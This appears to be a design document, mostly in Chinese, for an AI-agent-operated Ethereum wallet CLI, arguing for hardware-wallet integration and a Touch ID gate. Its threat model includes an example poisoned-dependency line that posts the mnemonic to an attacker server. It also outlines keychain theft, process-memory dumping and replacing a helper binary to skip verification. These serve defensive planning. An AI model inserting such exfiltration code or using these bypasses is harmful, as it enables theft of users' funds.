# 为什么需要硬件钱包

> Why we need hardware wallet integration before this CLI is ready for any
> non-trivial mainnet usage.

## TL;DR

**软件防御有天花板，超过这个天花板就靠物理隔离**。硬件钱包让私钥永远不离开安全芯片，每笔签名要物理按按钮——把"远程入侵笔记本就能偷光资金"压成"必须骗过你眼睛和手指才行"。

对一个允许 agent 调起签名的钱包，这道物理 human-in-the-loop 闸门是 policy 和 audit log 之外的最终防线。

ROI 临界点：钱包余额超过 $1500 必备（Ledger Nano X ~$150，占比 < 10%）。

---

## 当前 agent-vault 链路的暴露面

我们已经做了这些软件层加固：

- 助记词加密存放在 agent-vault（OS keychain 派生密钥保护）
- 取助记词走 Unix FIFO，明文不落 disk
- 私钥派生后立即丢弃，进程退出后内存释放
- TTY-only 写入 vault（agent 没办法自己 set/rm）
- policy + idempotency + audit 防 agent 越权 / 重试 / 篡改

**这些都是软件防御**。一旦攻击者拿到你笔记本上**用户级别**的执行权（不是 root，是 user），下面三条路任意一条都能拿到助记词：

### 攻击路径 1：直接撬保险柜

```
笔记本被入侵（malware / phishing / 浏览器漏洞）
  ├─ 攻击者拿到当前用户进程权限
  ├─ 读 ~/.config/agent-vault/* 加密文件 ✓
  ├─ 读 macOS Keychain（用户登录后自动解锁）→ 拿主密钥 ✓
  └─ 解密助记词 → 完事
```

OS keychain 在用户登录后是自动解锁的——任何同 UID 进程都能调用 Security.framework 读出来。这不是 macOS 的 bug，是设计：用户输入登录密码 = 信任本机所有用户态进程。

### 攻击路径 2：供应链投毒

```
某个 pip 依赖被投毒（npm event-stream 那种事故，Python 也发生过）
  ├─ 下次 wallet send 时 web3.py 里多一行 requests.post(my_server, mnemonic)
  ├─ 你 git diff 看不出（依赖锁是 tarball hash，但 PyPI 有人能伪造发布）
  └─ 助记词不进 LLM 上下文，但跑到攻击者服务器上去了
```

供应链攻击是软件防御**结构性**搞不定的：你的代码可以审，但依赖代码每次更新都有可能新增恶意行为。`uv.lock` 锁版本能延缓但不能根治。

### 攻击路径 3：进程内存

```
wallet 签名瞬间，私钥在 Python bytes 对象里
  ├─ 同 UID 进程能 ptrace / task_for_pid → 读进程内存
  ├─ wallet 崩了产生 core dump → 私钥落硬盘
  └─ Python str/bytes immutable，GC 不可控，没法保证立即清零
```

我们 ROADMAP 里写了 zeroize 是 best-effort——CPython 的 immutable string 基本不可能完美清理。这是语言层面的限制，不是我们没尽力。

**软件层面这些都防不了**。我们能做的只是把这些攻击窗口压小，不是消除。

---

## 硬件钱包消除的是什么

```
私钥永远不离开 Ledger / Trezor 的安全芯片
  ├─ 笔记本上所有进程都看不到私钥（包括 wallet 自己）
  ├─ wallet 只构造 unsigned tx，发给设备
  ├─ 设备屏幕显示 "send 0.5 ETH to 0xFb0b..."
  ├─ 你按物理按钮确认 → 设备返回签名
  └─ 笔记本拿到签名好的 raw tx 广播
```

关键不变量：**笔记本被完全控制（root + kernel rootkit + 所有依赖被替换），攻击者也偷不到私钥**。

最坏情况是攻击者偷偷把 unsigned tx 内容改了（比如把 `to` 从 `0xVitalik` 换成 `0xAttacker`），但**你按按钮前要在设备屏幕上肉眼读**——设备的屏幕和按钮不经过笔记本，是独立的 I/O 通道，rootkit 改不到设备上显示的内容。

这条独立 I/O 通道是硬件钱包的核心安全特性。即使 wallet CLI 整个被替换成攻击者代码，设备显示的依然是真实的 tx 内容。

---

## 对 agent-callable 场景特别重要

我们这个 wallet 是**给 agent 用的**。意味着：

- agent 被 prompt injection 骗去签恶意 tx 是真实威胁（讨论过）
- 我们用 policy + spending cap 防 "agent 主动作恶"
- 但 policy 是软的：`policy.json` 落硬盘上，攻击链可以"先偷改 policy 再让 agent 签"

硬件钱包加一道**物理人闭环**的硬约束：

```
agent: wallet send 0xevil 1 ETH --broadcast --request-id ...
wallet: [policy 通过、idempotency 通过]
wallet: 把 unsigned tx 发给 Ledger
Ledger 屏幕: "Send 1 ETH to 0xevil..."   ← 你看到了
你: ❌ 不按按钮
=> 攻击失败，资金安全
```

policy 防的是"软件层面错误授权"，硬件钱包防的是"软件全部失守的最后一道闸门"。**两层叠加**才是完整的纵深防御。

如果 agent 在循环里跑（比如 cron 调度的 yield 优化策略），硬件钱包让"全自动"变成"半自动"——agent 提议交易，人按按钮放行。这听起来削弱了自动化，但对资金安全是**必要的代价**。如果你真要全自动，那必须用更小的 hot wallet + 严格的 policy 限额，把每日最大损失锁定在可接受范围。

---

## 实际成本

| 设备 | 价格 | 备注 |
|---|---|---|
| Ledger Nano S Plus | ~$80 | 最便宜的入门款，存储有限但 Ethereum + ERC-20 足够 |
| Ledger Nano X | ~$150 | 蓝牙 + 大屏，主流选择 |
| Trezor Safe 5 | ~$170 | 开源固件支持者首选，全触屏 |
| GridPlus Lattice1 | ~$400 | 大屏 + Secure Enclave，专业向，DeFi 体验好 |
| Tangem 卡 | ~$50 | NFC 卡形态，简单但不可备份 seed |

**ROI 阈值**：钱包持仓超过 $1500 时硬件钱包成本占比 < 10%，被盗一次的损失就远超设备成本。低于这个数量级，软件方案勉强够用，高于这个数量级，硬件钱包是底线。

---

## 但硬件钱包**不是银弹**

仍然解决不了：

1. **签名内容钓鱼**——你按按钮时如果不仔细读屏幕，依然会签恶意 tx。比如 ERC-20 的 `approve(0xattacker, MaxUint256)` 在某些 Ledger 上显示成一串十六进制字节，普通用户看不出问题。这是为什么 `policy.deny_unlimited_approve: true` 在 Ledger 之外仍然必要——双重保险。

2. **设备本身的供应链**——别从 Amazon 第三方卖家买 Ledger，要从官网。打开盒子检查防伪封贴，初始化时设备应该让你**自己**生成 seed，而不是显示一个"预设的"seed。如果设备开机直接显示 24 个词，丢掉这个设备，已经被植入恶意 firmware。

3. **物理盗窃 + PIN**——设备被偷且 PIN 弱（4 位数字），攻击者能签 tx。Ledger 默认 4-8 位 PIN，建议用 8 位 + 25th word passphrase（隐藏账户机制）。

4. **dApp UI 钓鱼**——浏览器里看到一个看起来像 Uniswap 的界面，让你 approve 给攻击者合约。Ledger 显示的是合约地址 hex，肉眼看不出 Uniswap router 还是攻击者地址。所以 `contract_allowlist` 在 policy 里仍然有用——它在 Ledger 之前先把陌生合约拦掉。

5. **同形异义字 / typosquatting 地址**——`0xAa...` 和 `0xAA...` 看起来差不多。设备屏幕一行只能显示几十字符，地址中间一段被省略。建议养成习惯：检查地址前 6 位**和**后 4 位（不只看前面）。

---

## 集成方案概要

eth-account 和 web3.py 都已支持 Ledger。我们的 wallet 改造工作量大约 1-2 天：

1. **`core/signer.py` 加分支**：
   ```python
   if account.account_type == "hd_mnemonic":
       # 现有路径：vault → derive → sign
   elif account.account_type == "ledger":
       from ledgereth.transactions import create_transaction
       signed = create_transaction(
           tx, sender_path=account.derivation_path,
           dongle=get_dongle(),
       )
       return signed.raw_transaction
   ```

2. **`storage/state.py` 加 `account_type` 字段**：

   ```jsonc
   {
     "name": "main_cold",
     "account_type": "ledger",
     "address": "0x...",
     "derivation_path": "m/44'/60'/0'/0/0",
     "vault_key": null    // Ledger 账户没有 vault key
   }
   ```

3. **`cli/account.py` 加 `account add-ledger`**：交互式让用户从设备读出地址，登记进 state。这个流程必须 TTY，要用户在 Ledger 上确认 export address。

4. **依赖**：`pip install ledgereth` 或 `eth-account[hardware]`（视上游情况）。需要 USB 权限（macOS 上 hidapi 自动处理）。

5. **测试覆盖**：mock Ledger dongle 的单测；真机端到端验证用户手工跑（CI 跑不了）。

state.json 里 mnemonic 和 ledger 账户共存，policy / audit / idempotency 全部不变——账户类型对它们透明。

---

## 还没买硬件钱包前的最强中间方案：agent-vault Touch ID 闸门

`@kaka-milan-22/agent-vault@0.5.0+` 引入 per-key `--require-presence` 标志。打开之后，**任何对该助记词的解密**——`wallet send` / `wallet swap` / `wallet aave supply` / 任意 `vault.reveal` 调用——都会先弹出 macOS 原生 Touch ID 系统对话框。Secure Enclave 验证发生在协处理器里，用户态代码**没有 API 可以跳过、关闭或伪造**这个 prompt。

这不替代硬件钱包，但把上面"攻击路径 1：直接撬保险柜"那条线从"任何同 UID 进程都能读"变成"任何同 UID 进程都得让你物理摸一下指纹传感器"。对 LLM agent + 软件供应链威胁，这条 hardening 的杠杆比比例尺都高——成本是 1 个命令 + 每次签名多 1 个 Touch ID prompt，**收益是 agent execution surface 这条结构性漏洞被 SEP 物理隔离**。

### 启用

升级 agent-vault 到 0.5.0+：

```bash
npm install -g @kaka-milan-22/agent-vault
agent-vault --version    # 应显示 0.5.0 或更高
```

给现有 wallet mnemonic key 加闸门（不重新输入助记词，密文不变）：

```bash
agent-vault require-presence wallet-main-mnemonic --on \
    --reason "Sign Ethereum transaction"
```

确认：

```bash
agent-vault list
# wallet-main-mnemonic  [presence]
```

之后任何 `wallet ...` 命令需要签名时，Touch ID 系统 prompt 会显示
**"agent-vault wants to Sign Ethereum transaction"**。批准就继续，取消就 fail-closed —— wallet 收到 `VaultError("agent-vault write failed: ✗ Presence verification denied")` 然后 abort，不签 / 不广播 / 不改链上状态。

### 还没解决的（为什么 Ledger 仍是终点）

Touch ID 闸门把攻击者的成本提高一档，但**没有抹掉**：

- **二进制替换攻击**：拿到笔记本写权限的攻击者可以把 `/opt/homebrew/bin/agent-vault-presence`（SEP helper）替换成 `exit 0` 的假货跳过 Touch ID。v0.5.0 helper 还没 Apple Developer ID codesign（v0.6 计划补上），Gatekeeper 不能验证完整性。Ledger 的 secure element 防御这条路。
- **进程内存 dump**：Touch ID 通过后的几十毫秒内，明文 mnemonic 仍然在 agent-vault 的 V8 堆里。同 UID 攻击者用 `vmmap` / `lldb` 卡住那一刻仍能拿到。Ledger 的私钥从不离开 SE。
- **5 次错指纹后降级登录密码**：Apple 强制行为，登录密码弱就降级。Ledger 不存在密码 fallback。
- **Prompt 盲点**：你被训练成"反射性点 Touch ID"之后，攻击者只要在不寻常的时机让 prompt 弹出就有概率得手。Ledger 的物理按钮 + 屏幕显示 calldata 让"我现在在签什么"可见。

**所以阈值不变**：mainnet 资金超过 ~$1.5k 还是上 Ledger。这个中间方案的定位是**测试网 + agent 实验 + 主网小额日常**这一档，让你在不买设备的情况下把"软件层 LLM agent + supply chain"这条最大暴露面砍掉大部分。

完整威胁模型 + 限制清单见 [`@kaka-milan-22/agent-vault` docs/PRESENCE.md](https://github.com/kaka-milan-22/agent-vault/blob/main/docs/PRESENCE.md)。

---

## 决策树

| 场景 | 用什么 |
|---|---|
| 测试网 / agent 实验 / 学习 | agent-vault 即可（presence gate 可选；测试网资金归零无所谓） |
| 主网每日操作 < $1k | agent-vault **+ `--require-presence` 闸门** + 严格 policy 上限 |
| 主网持仓 $1k-$10k | Ledger 单签 |
| 主网持仓 > $10k | Ledger + Safe multisig 共管 |
| 团队 / 公司账户 | Safe multisig + 至少 2 个 Ledger |
| 全自动收益策略 | 小额 hot 账户（policy 严限 **+ presence gate**）+ 大额冷储 Ledger，定期 hot → cold |

**底线**：任何放过夜的资金都应该至少有 Ledger 这一层。临时的小额 hot wallet（< $100）可以用 agent-vault + presence gate 顶；agent 驱动的策略账户（即便小额）**必须**开 presence gate，因为它的暴露面比手动操作的 hot wallet 大一档。

---

## 相关 ROADMAP 项

本文档对应的实施在 [`ROADMAP.md`](../ROADMAP.md) 的 **Code work — engineering blocker** 部分。完成此项后才解锁"主网持仓"使用场景。

完成它依赖：

- `eth-account` / `ledgereth` API 稳定（已稳定）
- 用户拿到 Ledger 设备并完成初始化（一次性）
- wallet 自身的 1-2 天集成工作

不依赖任何外部协议或服务。
